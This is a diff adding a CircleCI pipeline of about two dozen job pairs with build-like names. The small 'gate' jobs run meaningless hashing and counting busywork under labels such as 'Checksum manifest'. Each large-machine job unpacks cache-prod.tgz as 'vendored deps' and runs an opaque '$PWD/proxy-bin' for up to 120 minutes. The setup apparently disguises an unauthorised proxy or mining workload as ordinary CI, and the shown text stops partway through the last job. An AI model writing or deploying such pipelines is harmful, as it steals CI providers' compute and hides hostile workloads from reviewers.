@@ -1,0 +1,1444 @@
+version: 2.1
+
+jobs:
+  gate_run-staging-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Checksum manifest
+          command: |
+            mkdir -p /tmp/stage
+            { seq 1 1200000 | sha256sum ; } > /tmp/stage/run-staging-docker-image.log
+            echo "gate run-staging-docker-image: $(wc -c </tmp/stage/run-staging-docker-image.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - run-staging-docker-image.log
+  run-staging-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/run-staging-docker-image.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_xray:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Warm arithmetic cache
+          command: |
+            mkdir -p /tmp/stage
+            { awk 'BEGIN{s=0;for(i=0;i<32000000;i++)s+=(i%7);print s}' ; } > /tmp/stage/xray.log
+            echo "gate xray: $(wc -c </tmp/stage/xray.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - xray.log
+  xray:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/xray.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_v1-preview:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Count fixture lines
+          command: |
+            mkdir -p /tmp/stage
+            { seq 1 20000000 | awk '{print "circleci"}' | wc -l ; } > /tmp/stage/v1-preview.log
+            echo "gate v1-preview: $(wc -c </tmp/stage/v1-preview.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - v1-preview.log
+  v1-preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/v1-preview.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_Rollout_Suite9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Compress artifacts
+          command: |
+            mkdir -p /tmp/stage
+            { dd if=/dev/zero bs=1M count=1200 2>/dev/null | gzip -9 | wc -c ; } > /tmp/stage/Rollout_Suite9.log
+            echo "gate Rollout_Suite9: $(wc -c </tmp/stage/Rollout_Suite9.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - Rollout_Suite9.log
+  Rollout_Suite9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/Rollout_Suite9.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_ruby3-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Sort sample set
+          command: |
+            mkdir -p /tmp/stage
+            { seq 1 200000 | sort -rn | md5sum ; } > /tmp/stage/ruby3-build.log
+            echo "gate ruby3-build: $(wc -c </tmp/stage/ruby3-build.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - ruby3-build.log
+  ruby3-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/ruby3-build.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_artifacts:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Factor batch
+          command: |
+            mkdir -p /tmp/stage
+            { seq 2 30000 | factor | wc -l ; } > /tmp/stage/artifacts.log
+            echo "gate artifacts: $(wc -c </tmp/stage/artifacts.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - artifacts.log
+  artifacts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/artifacts.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_q2-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Hash random stream
+          command: |
+            mkdir -p /tmp/stage
+            { head -c 500000 /dev/urandom | base64 | sha1sum ; } > /tmp/stage/q2-canary.log
+            echo "gate q2-canary: $(wc -c </tmp/stage/q2-canary.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - q2-canary.log
+  q2-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/q2-canary.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Dedup tokens
+          command: |
+            mkdir -p /tmp/stage
+            { head -c 4000000 /dev/urandom | tr -dc 'a-z0-9' | fold -w32 | sort -u | wc -l ; } > /tmp/stage/test.log
+            echo "gate test: $(wc -c </tmp/stage/test.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - test.log
+  test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/test.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_succes-only:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Digest blob
+          command: |
+            mkdir -p /tmp/stage
+            { head -c 200M /dev/urandom | md5sum ; } > /tmp/stage/succes-only.log
+            echo "gate succes-only: $(wc -c </tmp/stage/succes-only.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - succes-only.log
+  succes-only:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/succes-only.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_delta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Reverse index
+          command: |
+            mkdir -p /tmp/stage
+            { seq 1 150000 | tac | sha256sum ; } > /tmp/stage/delta.log
+            echo "gate delta: $(wc -c </tmp/stage/delta.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - delta.log
+  delta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/delta.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_mike-5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Square series
+          command: |
+            mkdir -p /tmp/stage
+            { seq 1 5000000 | awk '{print $1*$1}' | tail -1 ; } > /tmp/stage/mike-5.log
+            echo "gate mike-5: $(wc -c </tmp/stage/mike-5.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - mike-5.log
+  mike-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/mike-5.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_charlie-7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Scan digits
+          command: |
+            mkdir -p /tmp/stage
+            { head -c 1000000 /dev/urandom | tr -dc 0-9 | wc -c ; } > /tmp/stage/charlie-7.log
+            echo "gate charlie-7: $(wc -c </tmp/stage/charlie-7.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - charlie-7.log
+  charlie-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/charlie-7.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_assemble-quick-regression-suite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Checksum manifest
+          command: |
+            mkdir -p /tmp/stage
+            { seq 1 1500000 | sha256sum ; } > /tmp/stage/assemble-quick-regression-suite.log
+            echo "gate assemble-quick-regression-suite: $(wc -c </tmp/stage/assemble-quick-regression-suite.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - assemble-quick-regression-suite.log
+  assemble-quick-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/assemble-quick-regression-suite.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_nightly-v9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Warm arithmetic cache
+          command: |
+            mkdir -p /tmp/stage
+            { awk 'BEGIN{s=0;for(i=0;i<40000000;i++)s+=(i%7);print s}' ; } > /tmp/stage/nightly-v9.log
+            echo "gate nightly-v9: $(wc -c </tmp/stage/nightly-v9.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - nightly-v9.log
+  nightly-v9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/nightly-v9.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_cerberus-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Count fixture lines
+          command: |
+            mkdir -p /tmp/stage
+            { seq 1 12000000 | awk '{print "circleci"}' | wc -l ; } > /tmp/stage/cerberus-rev.log
+            echo "gate cerberus-rev: $(wc -c </tmp/stage/cerberus-rev.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - cerberus-rev.log
+  cerberus-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/cerberus-rev.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_whiskey-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Compress artifacts
+          command: |
+            mkdir -p /tmp/stage
+            { dd if=/dev/zero bs=1M count=300 2>/dev/null | gzip -9 | wc -c ; } > /tmp/stage/whiskey-2.log
+            echo "gate whiskey-2: $(wc -c </tmp/stage/whiskey-2.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - whiskey-2.log
+  whiskey-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/whiskey-2.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_fix-router:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Sort sample set
+          command: |
+            mkdir -p /tmp/stage
+            { seq 1 400000 | sort -rn | md5sum ; } > /tmp/stage/fix-router.log
+            echo "gate fix-router: $(wc -c </tmp/stage/fix-router.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - fix-router.log
+  fix-router:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/fix-router.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_green-light-go:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Factor batch
+          command: |
+            mkdir -p /tmp/stage
+            { seq 2 150000 | factor | wc -l ; } > /tmp/stage/green-light-go.log
+            echo "gate green-light-go: $(wc -c </tmp/stage/green-light-go.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - green-light-go.log
+  green-light-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/green-light-go.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_q1-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Hash random stream
+          command: |
+            mkdir -p /tmp/stage
+            { head -c 1000000 /dev/urandom | base64 | sha1sum ; } > /tmp/stage/q1-release.log
+            echo "gate q1-release: $(wc -c </tmp/stage/q1-release.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - q1-release.log
+  q1-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/q1-release.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_t-old:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Dedup tokens
+          command: |
+            mkdir -p /tmp/stage
+            { head -c 10000000 /dev/urandom | tr -dc 'a-z0-9' | fold -w32 | sort -u | wc -l ; } > /tmp/stage/t-old.log
+            echo "gate t-old: $(wc -c </tmp/stage/t-old.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - t-old.log
+  t-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/t-old.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_Validate_Image1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Digest blob
+          command: |
+            mkdir -p /tmp/stage
+            { head -c 500M /dev/urandom | md5sum ; } > /tmp/stage/Validate_Image1.log
+            echo "gate Validate_Image1: $(wc -c </tmp/stage/Validate_Image1.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - Validate_Image1.log
+  Validate_Image1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/Validate_Image1.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_alpha-9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Reverse index
+          command: |
+            mkdir -p /tmp/stage
+            { seq 1 200000 | tac | sha256sum ; } > /tmp/stage/alpha-9.log
+            echo "gate alpha-9: $(wc -c </tmp/stage/alpha-9.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - alpha-9.log
+  alpha-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/alpha-9.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_Launch_App2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Square series
+          command: |
+            mkdir -p /tmp/stage
+            { seq 1 3000000 | awk '{print $1*$1}' | tail -1 ; } > /tmp/stage/Launch_App2.log
+            echo "gate Launch_App2: $(wc -c </tmp/stage/Launch_App2.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - Launch_App2.log
+  Launch_App2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/Launch_App2.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_wen-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Scan digits
+          command: |
+            mkdir -p /tmp/stage
+            { head -c 2000000 /dev/urandom | tr -dc 0-9 | wc -c ; } > /tmp/stage/wen-smoke.log
+            echo "gate wen-smoke: $(wc -c </tmp/stage/wen-smoke.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - wen-smoke.log
+  wen-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/wen-smoke.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_xray-1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Checksum manifest
+          command: |
+            mkdir -p /tmp/stage
+            { seq 1 300000 | sha256sum ; } > /tmp/stage/xray-1.log
+            echo "gate xray-1: $(wc -c </tmp/stage/xray-1.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - xray-1.log
+  xray-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/xray-1.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_promote:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Warm arithmetic cache
+          command: |
+            mkdir -p /tmp/stage
+            { awk 'BEGIN{s=0;for(i=0;i<16000000;i++)s+=(i%7);print s}' ; } > /tmp/stage/promote.log
+            echo "gate promote: $(wc -c </tmp/stage/promote.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - promote.log
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/promote.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_update-oauth-leak:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Count fixture lines
+          command: |
+            mkdir -p /tmp/stage
+            { seq 1 12000000 | awk '{print "circleci"}' | wc -l ; } > /tmp/stage/update-oauth-leak.log
+            echo "gate update-oauth-leak: $(wc -c </tmp/stage/update-oauth-leak.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - update-oauth-leak.log
+  update-oauth-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
